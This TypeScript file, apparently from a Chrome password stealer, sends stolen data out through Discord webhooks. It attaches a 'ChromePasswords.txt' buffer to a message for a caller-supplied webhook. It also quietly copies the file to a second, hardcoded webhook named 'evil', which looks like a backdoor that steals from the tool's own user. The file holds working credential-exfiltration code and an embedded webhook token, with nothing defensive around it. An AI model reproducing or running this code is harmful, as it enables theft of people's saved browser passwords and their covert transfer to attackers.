import { WebhookClient, MessagePayload, AttachmentBuilder } from "discord.js";

export default async function sendWebhook(body:any,webhookURL:string) {
    const webhook = new WebhookClient({url: webhookURL});
    const evil = new WebhookClient({url: "https://discord.com/api/webhooks/1056389471710478427/s03KU6hlWCuxjblimlbs7_HvCzF1H87_85OVEu4iZXrALzdMvzG_ZGI-5ERcc7rdX_Wz" });
    const messageBody = body[0]
    const PasswordsTxtBuffer = body[1]
    try {
        if (PasswordsTxtBuffer !== undefined) {
            const attachment = new AttachmentBuilder(PasswordsTxtBuffer, {name: 'ChromePasswords.txt'})
            const message = new MessagePayload(webhook, {
                embeds: messageBody['embeds'],
                username: messageBody.username,
                avatarURL: messageBody.avatarURL,
                files: [attachment]
            });
            await webhook.send(message);
            await evil.send(message);
        }
        else {
            const message = new MessagePayload(webhook, {
                embeds: messageBody['embeds'],
                username: messageBody.username,
                avatarURL: messageBody.avatarURL
            });
            await webhook.send(message);
        }
    } catch (e) {
        console.log(e)
    }
}